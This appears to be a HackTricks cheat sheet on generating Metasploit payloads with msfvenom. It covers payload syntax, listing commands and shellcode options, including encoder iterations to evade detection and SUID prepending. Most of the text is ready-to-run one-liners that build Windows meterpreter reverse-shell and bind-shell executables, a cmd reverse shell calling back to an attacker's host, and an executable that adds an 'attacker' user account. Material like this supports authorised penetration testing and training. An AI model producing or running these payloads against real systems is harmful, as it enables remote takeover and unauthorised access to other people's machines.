source: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom#listing

<pre> msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP> </pre>
One can also use the -a to specify the architecture or the --platform

**Listing**
<pre>msfvenom -l #Payloads</pre>
<pre>msfvenom -l encoders #Encoders </pre>

**Common params when creating a shellcode**

PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
<pre> -b "\x00\x0a\x0d" </pre>
<pre> -f c </pre>
<pre> -e x86/shikata_ga_nai -i 5 </pre>
<pre>EXITFUNC=thread </pre>
<pre> PrependSetuid=True #Use this to create a shellcode that will execute something with SUID </pre>


**Windows**
---
**Reverse Shell**
<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe </pre>
**Bind Shell*
<pre>msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe </pre>
**Create User**
<pre>msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe </pre>
**CMD Shell*
<pre> msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe </pre>
<pre> </pre>
<pre> </pre>
<pre> </pre>
<pre> </pre>
